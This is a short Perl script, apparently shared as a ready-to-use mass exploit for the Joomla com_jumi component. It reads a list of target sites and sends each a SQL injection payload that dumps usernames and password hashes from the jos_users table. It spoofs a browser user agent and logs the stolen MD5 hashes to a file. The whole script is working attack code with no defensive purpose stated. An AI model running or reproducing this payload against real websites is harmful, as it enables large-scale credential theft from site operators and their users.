#!/usr/bin/perl -w
# By B7VM DZ
#  com_jumi exploit

# UsE: perl jumi.pl
#facebook:/mago.bvm/

use LWP::UserAgent;
use strict;
use 5.010;

print "Mass com_jumi exploit | By Joao Artur | www.github.com/JoaoArtur\n\n";
print " File name [list.txt]: ";
chomp(my $filename=<STDIN>);
open my $info,$filename or die("Couldn't open the file: $!");

while (my $linha = <$info>) {
	my $browser = LWP::UserAgent->new() or die "Error while starting the browser\n";
	$browser->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5,1)');
	my $url = $linha."/index.php?option=com_jumi&fileid=2&Itemid=4+UNION+SELECT+1,concat(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from/**/jos_users+--+";
	my $requisicao = $browser->request(HTTP::Request->new(GET=>$url));
	my $condicao = $requisicao->content;
	if ($condicao =~/([0-9a-fA-F]{32})/) {
		my $linha1 = join("",split("\n",$linha));
		print "MD5 Password from $linha1: $1\n";
		
		my $arquivo = 'jumi-vuln.txt';

		open(my $fh, '>>', $arquivo) or die "Could not open file '$arquivo' $!";
		say $fh "MD5 Password from $linha1: $1";
		close $fh;


	} else {
		print "Failed to exploit $linha";
	}
}
